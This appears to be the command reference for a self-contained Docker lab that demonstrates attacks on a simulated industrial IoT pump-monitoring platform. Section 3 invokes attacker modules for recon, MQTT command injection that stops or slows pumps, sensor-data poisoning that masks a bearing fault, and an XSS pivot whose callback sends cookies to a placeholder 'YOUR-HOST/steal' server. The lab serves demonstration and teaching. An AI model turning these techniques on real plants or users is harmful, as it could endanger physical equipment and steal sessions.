# COMMANDS

Everything you need to build, run, attack, and tear down the lab.
Run from the `iiot-pdm-lab/` directory.

Docker is the easiest path. Local venv works too — same attack commands
either way.

---

## Prerequisites

```bash
docker --version
docker compose version

# local: 3.11 or 3.12 (grpcio-tools has no wheels for 3.14 yet)
python3 --version
```

---

## 1. Build & start the stack (Docker)

```bash
docker compose build
docker compose up -d
```

Speed up the fault for a quicker demo (set before `up`):

```bash
export FAULT_DELAY=15 FAULT_RAMP=50 SAMPLE_INTERVAL=2 ALARM_SUSTAIN=6
docker compose up -d
```

Or foreground with live logs:

```bash
docker compose up --build
```

---

## 2. Verify the stack is healthy

```bash
docker compose ps   # expect 5 Up

curl -s -o /dev/null -w "HTTP %{http_code}\n" http://localhost:8000/

docker compose logs --tail=8 edge-node
docker compose logs --tail=6 platform

# state as JSON
curl -s http://localhost:8000/api/state | python3 -m json.tool

# one-liner health check
curl -s http://localhost:8000/api/state | python3 -c "
import json,sys
s=json.load(sys.stdin)
for p in s['pumps']:
    if not p['name'].startswith('Pump'): continue
    m=p['metrics']
    print(f\"{p['name']}: {p['health']:<8} DE={m.get('Bearing/DE Vibration')} mm/s  speed={m.get('Process/Speed')}%\")
print('work_orders:', len(s['work_orders']))
"
```

```bash
open http://localhost:8000        # macOS
xdg-open http://localhost:8000    # Linux
# or:  make dashboard
```

---

## 3. The attacks (Docker)

The `attacker` container is on the plant network with no credentials.

### 3.1 Recon

```bash
docker compose exec attacker python -m attacker.recon
# or:  make recon
```

### 3.2 Command injection

```bash
docker compose exec attacker python -m attacker.command --pump 102 --speed 20
# or:  make command PUMP=102 SPEED=20

docker compose exec attacker python -m attacker.command --pump 101 --stop
docker compose exec attacker python -m attacker.command --pump 101 --start

docker compose exec attacker python -m attacker.command --node-rebirth
```

Confirm it hit the physical layer with a direct Modbus read:

```bash
docker compose exec attacker python -c "
from pymodbus.client import ModbusTcpClient
c=ModbusTcpClient('plc-sim',port=502); c.connect()
rr=c.read_holding_registers(address=0,count=3,slave=102)
print(f'VFD-102: setpoint={rr.registers[0]}% run={rr.registers[1]} actual={rr.registers[2]}%')
c.close()"
```

### 3.3 Data poisoning

```bash
docker compose exec attacker python -m attacker.poison --pump 101 --de 2.1 --interval 0.5
# or:  make poison

# detached, fixed duration
docker compose exec -d attacker python -m attacker.poison --pump 101 --de 2.05 --interval 0.3 --duration 90
```

Compare what the platform sees vs what's really happening:

```bash
curl -s http://localhost:8000/api/state | python3 -c "
import json,sys; s=json.load(sys.stdin)
p=[x for x in s['pumps'] if x['name']=='Pump-101'][0]
print('platform:', p['health'], p['metrics'].get('Bearing/DE Vibration'), 'mm/s | WOs', len(s['work_orders']))"

docker compose logs --tail=20 edge-node | grep 'GROUND TRUTH' | tail -3
```

### 3.4 XSS pivot

```bash
# cookie exfil to your server
docker compose exec attacker python -m attacker.spoof_birth_xss --callback http://YOUR-HOST/steal
# or:  make xss

# visible banner (for demos/screenshots)
docker compose exec attacker python -m attacker.spoof_birth_xss --proof
```

Refresh `http://localhost:8000` to trigger it.

---

## 4. Full walkthrough (for recording)

```bash
make demo
# or:  ./demo.sh
```

Open the dashboard next to your terminal first. Runs: recon → command
injection → fault detection (unattacked baseline) → fault masking → XSS.

Tune the timing for a faster run:
```bash
FAULT_DELAY=12 FAULT_RAMP=40 ALARM_SUSTAIN=6 ./demo.sh
```

---

## 5. Screenshots (headless Chrome)

```bash
CHROME="/Applications/Google Chrome.app/Contents/MacOS/Google Chrome"

# one-off capture
"$CHROME" --headless=new --disable-gpu --hide-scrollbars --force-device-scale-factor=2 \
  --virtual-time-budget=6000 --window-size=1300,900 \
  --screenshot="docs/screenshots/dashboard.png" "http://localhost:8000"
```

The four blog screenshots:

```bash
mkdir -p docs/screenshots
shot(){ "$CHROME" --headless=new --disable-gpu --hide-scrollbars --force-device-scale-factor=2 \
        --virtual-time-budget="${2:-6000}" --window-size=1300,900 \
        --screenshot="$1" "http://localhost:8000" >/dev/null 2>&1; }

# 01 — baseline (right after up, before any fault)
shot docs/screenshots/01-baseline.png

# 02 — alarm (wait for Pump-101 to develop the fault)
shot docs/screenshots/02-alarm.png

# 03 — poisoned (dense poison running, short budget to catch the healthy poll)
docker compose exec -d attacker python -m attacker.poison --pump 101 --de 2.05 --interval 0.2 --duration 120
sleep 50
shot docs/screenshots/03-poisoned.png 1600

# 04 — XSS proof
docker compose exec -T attacker python -m attacker.spoof_birth_xss --proof
sleep 2
shot docs/screenshots/04-xss.png 4000
```

Architecture diagram (`brew install librsvg` if needed):

```bash
rsvg-convert -w 1240 -h 800 docs/architecture.svg -o docs/architecture.png
```

---

## 6. Reset / logs / teardown

```bash
# reset fault clock + clear platform state
docker compose up -d --force-recreate edge-node platform
# or:  make restart

# full reset including VFD registers
docker compose up -d --force-recreate plc-sim edge-node platform

docker compose logs -f
docker compose logs -f edge-node

# stop a detached poison (no pkill in the image, so just recreate)
docker compose restart edge-node platform

docker compose down
docker compose down -v   # also removes volumes
make clean               # down -v + strip pyc + generated pb2
```

---

## 7. Local run (no Docker)

You need a broker. Mosquitto works; so does `amqtt` (`pip install amqtt`).

```bash
python3.12 -m venv .venv && . .venv/bin/activate
pip install -r requirements.txt

# broker (pick one)
mosquitto -c broker/mosquitto.conf
# or: amqtt

# each in its own terminal; port 1502 for Modbus to avoid needing root
PLC_BIND=127.0.0.1 PLC_PORT=1502 python -m plc_sim.vfd
MQTT_HOST=127.0.0.1 PLC_HOST=127.0.0.1 PLC_PORT=1502 \
  FAULT_DELAY=15 FAULT_RAMP=50 SAMPLE_INTERVAL=2 python -m edge_node.node
MQTT_HOST=127.0.0.1 HTTP_PORT=8000 ALARM_SUSTAIN=6 python -m platform_app.app

# attacks
MQTT_HOST=127.0.0.1 python -m attacker.recon
MQTT_HOST=127.0.0.1 python -m attacker.command --pump 102 --speed 20
MQTT_HOST=127.0.0.1 python -m attacker.poison  --pump 101 --de 2.1 --interval 0.5
MQTT_HOST=127.0.0.1 python -m attacker.spoof_birth_xss --proof

# demo script against local stack
API=http://127.0.0.1:8000 \
PLANT_PY="env MQTT_HOST=127.0.0.1 .venv/bin/python" \
RESET_STACK="echo skip-reset" \
GROUND_TRUTH="echo no-docker-logs" \
./demo.sh
```

---

## 8. Environment variables

| Var | Default | Where | Meaning |
|-----|---------|-------|---------|
| `FAULT_DELAY` | 25 | edge | seconds before Pump-101's bearing fault starts |
| `FAULT_RAMP` | 240 | edge | seconds for the fault to fully develop |
| `FAULT_MAX` | 9.0 | edge | mm/s added at full fault |
| `SAMPLE_INTERVAL` | 3 | edge | publish interval (s) |
| `ALARM_SUSTAIN` | 6 | platform | seconds over the band before an alarm latches |
| `MQTT_HOST` / `MQTT_PORT` | localhost / 1883 | all | broker location |
| `PLC_HOST` / `PLC_PORT` | localhost / 502 | edge, plc | Modbus location |
| `HTTP_PORT` | 8000 | platform | dashboard port |

Ports exposed by Docker: `1883` (MQTT), `8000` (dashboard), `5020` (Modbus, host side).
